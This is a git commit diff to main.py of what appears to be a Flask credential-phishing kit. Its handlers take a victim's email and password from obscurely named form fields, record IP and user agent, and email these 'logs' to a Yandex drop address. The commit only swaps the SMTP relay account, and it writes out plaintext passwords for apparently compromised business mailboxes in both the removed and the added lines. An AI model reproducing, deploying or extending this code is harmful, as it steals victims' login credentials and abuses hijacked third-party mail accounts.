a2792ebff6cf8c1ce4de4f904a4901880dcf5020
sirintra00 <sirintra@aromaxinterplus.com>
2025-09-01 01:33:45 -0700

    Update main.py

--- main.py
+++ main.py
@@ -176,10 +176,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'eissa@waterworldwaterpark.com'
-        sender_emaill = 'eissa'
+        sender_email = 'munna@onegroupbd.com'
+        sender_emaill = 'munna'
         receiver_email = 'Bumzyinc@yandex.com'
-        password = 'EISSA47314A'
+        password = 'MUNNA@ONE123'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS ! 1'
@@ -198,7 +198,7 @@ def first():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('mail.waterworldwaterpark.com', 465) as server:
+        with smtplib.SMTP_SSL('mail.onegroupbd.com', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
@@ -217,10 +217,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'eissa@waterworldwaterpark.com'
-        sender_emaill = 'eissa'
+        sender_email = 'munna@onegroupbd.com'
+        sender_emaill = 'munna'
         receiver_email = 'Bumzyinc@yandex.com'
-        password = 'EISSA47314A'
+        password = 'MUNNA@ONE123'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS !! 2'
@@ -239,7 +239,7 @@ def second():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('mail.waterworldwaterpark.com', 465) as server:
+        with smtplib.SMTP_SSL('mail.onegroupbd.com', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
